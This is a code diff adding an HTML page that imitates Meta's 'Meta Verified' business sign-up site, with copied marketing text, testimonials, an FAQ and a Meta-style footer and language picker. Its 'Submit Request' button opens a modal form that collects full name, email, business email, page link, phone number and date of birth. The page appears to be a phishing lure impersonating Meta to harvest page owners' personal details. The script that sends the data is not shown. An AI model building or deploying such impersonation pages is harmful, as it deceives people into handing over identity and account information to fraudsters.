+                                    stroke-linejoin="round" />
+                            </svg>
+                        </h3>
+                        <div class="benefit-desc overflow-hidden transition-all duration-400" style="max-height: 0;">
+                            <p class="mt-4 text-[15px] text-[#465A69] leading-[1.6] max-w-md">
+                                <span data-i18n="benefits.profile.desc">Enrich your profile by adding images to your
+                                    links to help boost
+                                    engagement.</span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <!-- Steps Section -->
+        <div class="bg-[url('images/meta/bg_step_verified.jpg')] bg-cover bg-center bg-no-repeat my-20 scroll-fade">
+            <div class="max-w-[1440px] mx-auto md:py-20 py-10 md:px-6 px-3">
+                <div class="w-[100%]">
+                    <p class="text-[32px]" data-i18n="steps.title">Sign up for Meta Verified.</p>
+                    <p class="text-[16px] text-[#1c2b33] font-[300] my-4" data-i18n="steps.subtitle">Our verification
+                        process is designed to
+                        maintain the integrity of the verified badge for businesses.</p>
+                    <div class="grid grid-cols-12 gap-4 pt-12">
+                        <div
+                            class="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
+                            <img src="images/meta/one.png" alt="step 1"
+                                class="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]">
+                            <h3 class="text-[24px] font-[300]" data-i18n="steps.1.title">Start your application.</h3>
+                            <p class="mt-3 text-[14px] text-[#465A69] font-[300]" data-i18n="steps.1.desc">Those
+                                interested in applying for Meta
+                                Verified will need to register and meet certain eligibility requirements (requirements
+                                for Facebook and Instagram). When getting started, you should have your business contact
+                                information ready.</p>
+                        </div>
+                        <div
+                            class="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
+                            <img src="images/meta/two.png" alt="step 2"
+                                class="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]">
+                            <h3 class="text-[24px] font-[300]" data-i18n="steps.2.title">Verify business details.</h3>
+                            <p class="mt-3 text-[14px] text-[#465A69] font-[300]" data-i18n="steps.2.desc">You may be
+                                asked to share details such
+                                as your business name, address, website and/or phone number.</p>
+                        </div>
+                        <div
+                            class="md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10 shadow-lg">
+                            <img src="images/meta/three.png" alt="step 3"
+                                class="w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]">
+                            <h3 class="text-[24px] font-[300]" data-i18n="steps.3.title">Get reviewed.</h3>
+                            <p class="mt-3 text-[14px] text-[#465A69] font-[300]" data-i18n="steps.3.desc">We'll review
+                                your application and send
+                                an update on your status within three business days.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Testimonial -->
+        <div class="bg-white scroll-fade">
+            <div class="max-w-[1440px] mx-auto md:py-20 py-10 md:px-6 px-3">
+                <h2 class="text-[32px] font-semibold text-center mb-12" data-i18n="testimonial.title">See how Meta
+                    Verified has helped real
+                    businesses.</h2>
+                <!-- Slide Container -->
+                <div class="overflow-hidden rounded-[32px]">
+                    <div id="testimonial-track" class="flex transition-transform duration-500 ease-in-out"
+                        style="transform: translateX(0%)">
+                        <!-- Slide 1 -->
+                        <div
+                            class="w-full flex-shrink-0 bg-[#F0F2F5] md:py-12 md:px-14 p-6 text-center flex flex-col items-center justify-center">
+                            <p
+                                class="md:text-[20px] text-[16px] text-[#1c2b33] mb-6 max-w-[800px] mx-auto font-[400] leading-[1.6]">
+                                &ldquo;After enrolling in Meta Verified, I noticed increased reach on my posts and
+                                higher engagement with my audience. I think seeing a verified badge builds trust. People
+                                that I don&rsquo;t know or newer brands interested in working with me can be sure that
+                                they&rsquo;re talking with me and not a scammer.&rdquo;</p>
+                            <p class="text-[#465A69] font-[500] leading-[1.5]">Kimber Greenwood, Owner of Water
+                                Bear<br>Photography</p>
+                        </div>
+                        <!-- Slide 2 -->
+                        <div
+                            class="w-full flex-shrink-0 bg-[#F0F2F5] md:py-12 md:px-14 p-6 text-center flex flex-col items-center justify-center">
+                            <p
+                                class="md:text-[20px] text-[16px] text-[#1c2b33] mb-6 max-w-[800px] mx-auto font-[400] leading-[1.6]">
+                                &ldquo;Since subscribing, I&rsquo;ve noticed a real difference. My posts are getting
+                                more reach, engagement has gone up, and I&rsquo;m seeing more interactions on stories
+                                and reels.&rdquo;
+                            </p>
+                            <p class="text-[#465A69] font-[500] leading-[1.5]">Devon Kirby, Owner, Mom Approved Miami
+                            </p>
+                        </div>
+                        <!-- Slide 3 -->
+                        <div
+                            class="w-full flex-shrink-0 bg-[#F0F2F5] md:py-12 md:px-14 p-6 text-center flex flex-col items-center justify-center">
+                            <p
+                                class="md:text-[20px] text-[16px] text-[#1c2b33] mb-6 max-w-[800px] mx-auto font-[400] leading-[1.6]">
+                                &ldquo;Having a verified account signals to both our existing followers and new visitors
+                                that we are a credible, professional business that takes both our products and social
+                                presence seriously.&rdquo;
+                            </p>
+                            <p class="text-[#465A69] font-[500] leading-[1.5]">Sarah Clancy, Owner of Sarah Marie
+                                Running Co.</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Carousel Navigation -->
+                <div class="flex items-center justify-center gap-4 mt-8">
+                    <button onclick="changeTestimonial(-1)"
+                        class="w-8 h-8 rounded-full border border-[#cbd2d9] flex items-center justify-center hover:bg-gray-100 transition-colors cursor-pointer">
+                        <svg class="w-3 h-3" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                        </svg>
+                    </button>
+                    <div id="carousel-dots" class="flex gap-2">
+                        <div class="w-[7px] h-[7px] rounded-full bg-[#1c2b33] transition-colors duration-300"></div>
+                        <div class="w-[7px] h-[7px] rounded-full bg-[#cbd2d9] transition-colors duration-300"></div>
+                        <div class="w-[7px] h-[7px] rounded-full bg-[#cbd2d9] transition-colors duration-300"></div>
+                    </div>
+                    <button onclick="changeTestimonial(1)"
+                        class="w-8 h-8 rounded-full border border-[#cbd2d9] flex items-center justify-center hover:bg-gray-100 transition-colors cursor-pointer">
+                        <svg class="w-3 h-3" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- CTA Section - Ready to become Meta Verified? -->
+        <div class="bg-[#f5f6f7] overflow-hidden scroll-fade">
+            <div class="max-w-[1440px] mx-auto md:py-28 py-16 md:px-20 px-6">
+                <div class="flex flex-col md:flex-row items-center gap-12">
+                    <!-- Left Content -->
+                    <div class="md:w-[35%] w-full">
+                        <!-- Verified Badge Icon -->
+                        <img src="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&ab_page=CMS&ab_entry=680460844602208&version=1770656829"
+                            alt="Verified" class="w-[72px] h-[72px] mb-8" loading="lazy">
+                        <h2 class="text-[36px] md:text-[44px] font-[500] text-[#1c2b33] leading-[1.15] mb-8"
+                            data-i18n="cta.title">Ready to
+                            become<br>Meta Verified?</h2>
+                        <button id="btn-subscribe-cta" data-i18n="cta.button"
+                            class="bg-[#0064e0] text-white px-8 py-[14px] inline-flex items-center justify-center rounded-[45px] font-[700] text-[15px] cursor-pointer hover:bg-[#0056c7] transition-colors"
+                            onclick="showModal('modal-info')" style="font-family: 'Optimistic VF', sans-serif;">
+                            Submit Request
+                        </button>
+                    </div>
+                    <!-- Right Content - Video -->
+                    <div class="md:w-[60%] w-full overflow-visible flex items-center justify-end md:-mr-6">
+                        <video autoplay loop muted playsinline loading="lazy" class="w-full block"
+                            src="images/hero-video.mp4">
+                        </video>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <section id="faq-section" class="py-20 px-6 bg-white scroll-fade">
+            <div class="max-w-[1200px] mx-auto">
+                <h2 class="text-[28px] font-semibold mb-2" data-i18n="faq.title">Frequently asked questions</h2>
+                <p class="mb-8 text-[#465A69]" data-i18n="faq.helpCentre">For more, visit our <a href="#"
+                        class="text-[#0062FF] underline">Help
+                        Centre</a>.</p>
+                <div class="border-t border-gray-200">
+                    <!-- FAQ 1 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q1">How do I know if my business is eligible?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a1">Meta Verified is available for businesses
+                                that meet certain
+                                eligibility requirements in selected regions. You will need to register and meet certain
+                                eligibility requirements to sign up.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 2 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q2">How do I update my information if I'm not eligible?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a2">Join our waitlist to stay updated. We'll
+                                notify you when Meta
+                                Verified for Business becomes available for you. Joining the waitlist does not guarantee
+                                early access to Meta Verified.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 3 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q3">What if I already have a verified badge?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a3">No action is needed to keep your badge.
+                                Existing verified
+                                badge holders can apply for a Meta Verified subscription to access additional benefits
+                                if they meet the eligibility requirements.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 4 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q4">What if I'm interested in Meta Verified for creators?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a4">You can learn more and sign up on the Meta
+                                Verified for
+                                creators website.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 5 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q5">Where will my badge appear?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a5">If you choose a Facebook asset to include
+                                in your
+                                subscription, your Facebook Page and Messenger account will display the verified badge.
+                                If you choose an Instagram asset, your Instagram and Threads accounts will display the
+                                verified badge.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 6 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q6">What determines which plans I can purchase?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a6">The plans available to you depend on your
+                                region, business
+                                type, and other eligibility criteria. Features, availability, and pricing may vary by
+                                region.</p>
+                        </div>
+                    </div>
+                    <!-- FAQ 7 -->
+                    <div class="border-b border-gray-200">
+                        <button class="w-full flex justify-between items-center py-6 text-left text-[18px] font-medium"
+                            onclick="toggleFaq(this)">
+                            <span data-i18n="faq.q7">Do my Meta Verified benefits extend to other accounts?</span>
+                            <svg class="w-6 h-6 transition-transform flex-shrink-0 ml-4" fill="none"
+                                stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7" />
+                            </svg>
+                        </button>
+                        <div class="faq-answer">
+                            <p class="pb-6 text-[#65676B]" data-i18n="faq.a7">Meta Verified benefits apply to the
+                                specific accounts
+                                included in your subscription. Additional accounts may require separate subscriptions.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Connection Banner -->
+        <section class="py-20 px-6 scroll-fade"
+            style="background: linear-gradient(135deg, #d4e4f7 0%, #f0d4e8 30%, #fce4ec 50%, #e8f5e9 70%, #c8e6c9 100%);">
+            <div class="max-w-[800px] mx-auto text-center">
+                <h2 class="text-[28px] md:text-[32px] font-[500] text-[#1c2b33] leading-[1.4] mb-8"
+                    data-i18n="connection.title">Every connection is
+                    an opportunity.<br>It’s Your World.</h2>
+                <img src="images/meta/logo-meta.svg" alt="Meta" class="w-[100px] mx-auto">
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="bg-[#1B2A33] text-white">
+            <div class="max-w-[1200px] mx-auto px-6">
+                <!-- Newsletter Section -->
+                <div class="py-16 border-b border-white/10">
+                    <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-8">
+                        <div class="max-w-[480px]">
+                            <h3 class="text-[22px] font-semibold mb-3 leading-[1.3]"
+                                data-i18n="footer.newsletter.title">Get the latest updates from Meta
+                                for Business.</h3>
+                            <p class="text-[#9BA3AF] text-[14px] leading-[1.6]" data-i18n="footer.newsletter.desc">
+                                Provide your email address to receive
+                                the latest updates from Meta for Business, including news, events and product updates.
+                            </p>
+                        </div>
+                        <div class="flex gap-3 flex-shrink-0 footer-newsletter-actions">
+                            <input type="email" placeholder="Your email address"
+                                data-i18n-placeholder="footer.emailPlaceholder"
+                                class="px-4 py-3 rounded-lg text-gray-800 w-64 text-[14px] bg-white">
+                            <button
+                                class="bg-[#0062FF] px-6 py-3 rounded-full font-[600] text-[14px] hover:bg-[#0056d2] transition-colors whitespace-nowrap cursor-pointer"
+                                data-i18n="footer.subscribe">Subscribe</button>
+                        </div>
+                    </div>
+                    <p class="text-[11px] text-[#7A8B98] mt-4 max-w-[700px] leading-[1.5]" data-i18n="footer.consent">By
+                        submitting this form, you
+                        agree to receive marketing-related electronic communications from Meta, including news, events,
+                        updates and promotional emails. You may withdraw your consent and unsubscribe at any time. Your
+                        data will be processed in accordance with Meta's <a href="#" class="underline">Data Policy</a>.
+                    </p>
+                </div>
+                <!-- Bottom Footer — Meta-style grid -->
+                <div class="footer-bottom">
+                    <!-- Left: Copyright -->
+                    <div class="footer-bottom-left">
+                        <span class="footer-copyright">&copy; <span id="footer-year">2026</span> Meta</span>
+                    </div>
+                    <!-- Right: 7-column grid -->
+                    <div class="footer-bottom-grid">
+                        <!-- Col 1 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.about">About</a>
+                            <a href="javascript:void(0)" onclick="switchLang('en')" data-lang="en-uk"
+                                class="footer-lang-link lang-link">English (UK)</a>
+                        </div>
+                        <!-- Col 2 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.developers">Developers</a>
+                            <a href="javascript:void(0)" onclick="switchLang('en')" data-lang="en"
+                                class="footer-lang-link lang-link footer-lang-active">English (US)</a>
+                        </div>
+                        <!-- Col 3 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.careers">Careers</a>
+                            <a href="javascript:void(0)" onclick="switchLang('es')" data-lang="es"
+                                class="footer-lang-link lang-link">Español</a>
+                        </div>
+                        <!-- Col 4 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.privacy">Privacy</a>
+                            <a href="javascript:void(0)" onclick="switchLang('pt')" data-lang="pt"
+                                class="footer-lang-link lang-link">Português (Brasil)</a>
+                        </div>
+                        <!-- Col 5 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.cookies">Cookies</a>
+                            <a href="javascript:void(0)" onclick="switchLang('fr')" data-lang="fr"
+                                class="footer-lang-link lang-link">Français (France)</a>
+                        </div>
+                        <!-- Col 6 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.terms">Terms</a>
+                            <a href="javascript:void(0)" onclick="switchLang('es')" data-lang="es-es"
+                                class="footer-lang-link lang-link">Español (España)</a>
+                        </div>
+                        <!-- Col 7 -->
+                        <div class="footer-grid-col">
+                            <a href="#" class="footer-nav-link" data-i18n="footer.helpCentre2">Help Centre</a>
+                            <a href="javascript:void(0)" onclick="toggleMoreLangs()" id="more-langs-btn"
+                                class="footer-lang-link footer-more-langs">More languages <svg width="10" height="10"
+                                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                                    style="vertical-align:middle">
+                                    <path d="M9 18l6-6-6-6" />
+                                </svg></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </div>
+    </footer>
+
+    <!-- "Select a Language" Modal (Meta-style pixel-perfect) -->
+    <div id="lang-modal-overlay" class="lang-modal-overlay" onclick="if(event.target===this)closeLangModal()">
+        <div class="lang-modal">
+            <div class="lang-modal-header">Select a Language</div>
+            <div class="lang-modal-body">
+                <div class="lang-modal-sidebar">
+                    <a class="lang-modal-region active" data-region="all" onclick="filterLangRegion('all')">All
+                        Languages</a>
+                    <a class="lang-modal-region" data-region="africa" onclick="filterLangRegion('africa')">Africa and
+                        Middle East</a>
+                    <a class="lang-modal-region" data-region="americas"
+                        onclick="filterLangRegion('americas')">Americas</a>
+                    <a class="lang-modal-region" data-region="asia" onclick="filterLangRegion('asia')">Asia-Pacific</a>
+                    <a class="lang-modal-region" data-region="eastern-eu"
+                        onclick="filterLangRegion('eastern-eu')">Eastern Europe</a>
+                    <a class="lang-modal-region" data-region="western-eu"
+                        onclick="filterLangRegion('western-eu')">Western Europe</a>
+                </div>
+                <div class="lang-modal-langs" id="lang-modal-langs">
+                    <!-- Row 1 -->
+                    <a class="lang-modal-lang" data-lang="en" data-regions="all,americas"
+                        onclick="switchLang('en');closeLangModal()">English (US)</a>
+                    <a class="lang-modal-lang" data-lang="cs" data-regions="all,eastern-eu"
+                        onclick="switchLang('cs');closeLangModal()">Čeština</a>
+                    <a class="lang-modal-lang" data-lang="nb" data-regions="all,western-eu"
+                        onclick="switchLang('nb');closeLangModal()">Norsk (bokmål)</a>
+                    <!-- Row 2 -->
+                    <a class="lang-modal-lang current-lang" data-lang="en-uk" data-regions="all,western-eu"
+                        onclick="switchLang('en');closeLangModal()">English (UK)</a>
+                    <a class="lang-modal-lang" data-lang="da" data-regions="all,western-eu"
+                        onclick="switchLang('da');closeLangModal()">Dansk</a>
+                    <a class="lang-modal-lang" data-lang="nl" data-regions="all,western-eu"
+                        onclick="switchLang('nl');closeLangModal()">Nederlands</a>
+                    <!-- Row 3 -->
+                    <a class="lang-modal-lang" data-lang="es" data-regions="all,americas"
+                        onclick="switchLang('es');closeLangModal()">Español</a>
+                    <a class="lang-modal-lang" data-lang="el" data-regions="all,eastern-eu"
+                        onclick="switchLang('el');closeLangModal()">Ελληνικά</a>
+                    <a class="lang-modal-lang" data-lang="pl" data-regions="all,eastern-eu"
+                        onclick="switchLang('pl');closeLangModal()">Polski</a>
+                    <!-- Row 4 -->
+                    <a class="lang-modal-lang" data-lang="pt" data-regions="all,americas"
+                        onclick="switchLang('pt');closeLangModal()">Português (Brasil)</a>
+                    <a class="lang-modal-lang" data-lang="fi" data-regions="all,western-eu"
+                        onclick="switchLang('fi');closeLangModal()">Suomi</a>
+                    <a class="lang-modal-lang" data-lang="pt-pt" data-regions="all,western-eu"
+                        onclick="switchLang('pt');closeLangModal()">Português (Portugal)</a>
+                    <!-- Row 5 -->
+                    <a class="lang-modal-lang" data-lang="fr" data-regions="all,western-eu"
+                        onclick="switchLang('fr');closeLangModal()">Français (France)</a>
+                    <a class="lang-modal-lang" data-lang="fr-ca" data-regions="all,americas"
+                        onclick="switchLang('fr');closeLangModal()">Français (Canada)</a>
+                    <a class="lang-modal-lang" data-lang="ro" data-regions="all,eastern-eu"
+                        onclick="switchLang('ro');closeLangModal()">Română</a>
+                    <!-- Row 6 -->
+                    <a class="lang-modal-lang" data-lang="es-es" data-regions="all,western-eu"
+                        onclick="switchLang('es');closeLangModal()">Español (España)</a>
+                    <a class="lang-modal-lang" data-lang="he" data-regions="all,africa"
+                        onclick="switchLang('he');closeLangModal()">עברית</a>
+                    <a class="lang-modal-lang" data-lang="ru" data-regions="all,eastern-eu"
+                        onclick="switchLang('ru');closeLangModal()">Русский</a>
+                    <!-- Row 7 -->
+                    <a class="lang-modal-lang" data-lang="ar" data-regions="all,africa"
+                        onclick="switchLang('ar');closeLangModal()">العربية</a>
+                    <a class="lang-modal-lang" data-lang="hi" data-regions="all,asia"
+                        onclick="switchLang('hi');closeLangModal()">हिन्दी</a>
+                    <a class="lang-modal-lang" data-lang="sv" data-regions="all,western-eu"
+                        onclick="switchLang('sv');closeLangModal()">Svenska</a>
+                    <!-- Row 8 -->
+                    <a class="lang-modal-lang" data-lang="vi" data-regions="all,asia"
+                        onclick="switchLang('vi');closeLangModal()">Tiếng Việt</a>
+                    <a class="lang-modal-lang" data-lang="hu" data-regions="all,eastern-eu"
+                        onclick="switchLang('hu');closeLangModal()">Magyar</a>
+                    <a class="lang-modal-lang" data-lang="tr" data-regions="all,eastern-eu"
+                        onclick="switchLang('tr');closeLangModal()">Türkçe</a>
+                    <!-- Row 9 -->
+                    <a class="lang-modal-lang" data-lang="it" data-regions="all,western-eu"
+                        onclick="switchLang('it');closeLangModal()">Italiano</a>
+                    <a class="lang-modal-lang" data-lang="id" data-regions="all,asia"
+                        onclick="switchLang('id');closeLangModal()">Bahasa Indonesia</a>
+                    <a class="lang-modal-lang" data-lang="zh-cn" data-regions="all,asia"
+                        onclick="switchLang('zh');closeLangModal()">中文(简体)</a>
+                    <!-- Row 10 -->
+                    <a class="lang-modal-lang" data-lang="de" data-regions="all,western-eu"
+                        onclick="switchLang('de');closeLangModal()">Deutsch</a>
+                    <a class="lang-modal-lang" data-lang="ja" data-regions="all,asia"
+                        onclick="switchLang('ja');closeLangModal()">日本語</a>
+                    <a class="lang-modal-lang" data-lang="zh-hk" data-regions="all,asia"
+                        onclick="switchLang('zh');closeLangModal()">中文(香港)</a>
+                    <!-- Row 11 -->
+                    <a class="lang-modal-lang" data-lang="th" data-regions="all,asia"
+                        onclick="switchLang('th');closeLangModal()">ภาษาไทย</a>
+                    <a class="lang-modal-lang" data-lang="ko" data-regions="all,asia"
+                        onclick="switchLang('ko');closeLangModal()">한국어</a>
+                    <a class="lang-modal-lang" data-lang="tl" data-regions="all,asia"
+                        onclick="switchLang('tl');closeLangModal()">Filipino</a>
+                    <!-- Row 12 -->
+                    <a class="lang-modal-lang" data-lang="zh-tw" data-regions="all,asia"
+                        onclick="switchLang('zh');closeLangModal()">中文(台灣)</a>
+                    <a class="lang-modal-lang" data-lang="ms" data-regions="all,asia"
+                        onclick="switchLang('ms');closeLangModal()">Bahasa Melayu</a>
+                </div>
+            </div>
+            <div class="lang-modal-footer">
+                <button class="lang-modal-close" onclick="closeLangModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: Information Form (from required.html) -->
+    <div id="modal-info" class="modal">
+        <div class="modal-overlay" onclick="hideModal('modal-info')"></div>
+        <div class="modal-container">
+            <div class="modal-content" style="max-width:450px;height:auto;overflow-y:visible;">
+    <button class="modal-close" onclick="hideModal('modal-info')" aria-label="Close form">&times;</button>
+    <h2 class="text-[17px] font-semibold mb-4" data-i18n="modal.info.title">Information Form</h2>
+                <form id="form-info">
+                    <div
+                        class="float-label-wrap input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                        <input id="fullName" placeholder=" " class="w-full outline-[0] h-full bg-transparent" required>
+                        <label class="float-label" data-i18n="modal.info.fullName">Full Name</label>
+                    </div>
+                    <div
+                        class="float-label-wrap input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                        <input id="email" placeholder=" " class="w-full outline-[0] h-full bg-transparent" type="email"
+                            required>
+                        <label class="float-label" data-i18n="modal.info.email">Email</label>
+                    </div>
+                    <div class="form-error" id="error-email"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <line x1="12" y1="8" x2="12" y2="12" />
+                            <line x1="12" y1="16" x2="12.01" y2="16" />
+                        </svg><span></span></div>
+                    <div
+                        class="float-label-wrap input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                        <input id="emailBusiness" placeholder=" " class="w-full outline-[0] h-full bg-transparent">
+                        <label class="float-label" data-i18n="modal.info.emailBusiness">Email Business</label>
+                    </div>
+                    <div
+                        class="float-label-wrap input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                        <input id="fanpage" placeholder=" " class="w-full outline-[0] h-full bg-transparent" required>
+                        <label class="float-label" data-i18n="modal.info.pageName">Link to Page</label>
+                    </div>
+
+                    <!-- Phone Input -->
+                    <div
+                        class="input w-full border border-[#d4dbe3] h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px]">
+                        <div class="react-tel-input">
+                            <input class="form-control" placeholder="Phone number"
+                                data-i18n-placeholder="modal.info.phone" type="tel" id="phone" value="+1 " required>
+                            <div class="flag-dropdown" id="flag-dropdown">
+                                <div class="selected-flag" title="United States: +1" onclick="toggleCountryDropdown()">
+                                    <img id="selected-flag-img" src="https://flagcdn.com/w20/us.png"
+                                        class="w-5 h-4 rounded-sm">
+                                    <div class="arrow"></div>
+                                </div>
+                                <ul id="country-dropdown" class="country-list" style="display:none">
+                                    <li class="country-search-wrap" onclick="event.stopPropagation()">
+                                        <input type="text" id="country-search" placeholder="Search country..."
+                                            data-i18n-placeholder="modal.info.searchCountry" autocomplete="off">
+                                    </li>
+                                    <!-- Populated dynamically by JS -->
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-error" id="error-phone"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <line x1="12" y1="8" x2="12" y2="12" />
+                            <line x1="12" y1="16" x2="12.01" y2="16" />
+                        </svg><span></span></div>
+
+                    <div><b class="text-[#9a979e] text-[14px] mb-[7px]" data-i18n="modal.info.dob">Date of Birth</b>
+                    </div>
+                    <div class="grid grid-cols-3 gap-[10px]">
+                        <div
+                            class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input placeholder="Day" data-i18n-placeholder="modal.info.day" id="day"
+                                class="w-full outline-0 h-full bg-transparent" type="number" min="1" max="31" required
+                                oninput="31<this.value&&(this.value=31),this.value<1&&''!=this.value&&(this.value=1)">
+                        </div>
+                        <div
+                            class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input placeholder="Month" data-i18n-placeholder="modal.info.month"
+                                class="w-full outline-0 h-full bg-transparent" id="month" type="number" min="1" max="12"
+                                required
+                                oninput="12<this.value&&(this.value=12),this.value<1&&''!=this.value&&(this.value=1)">
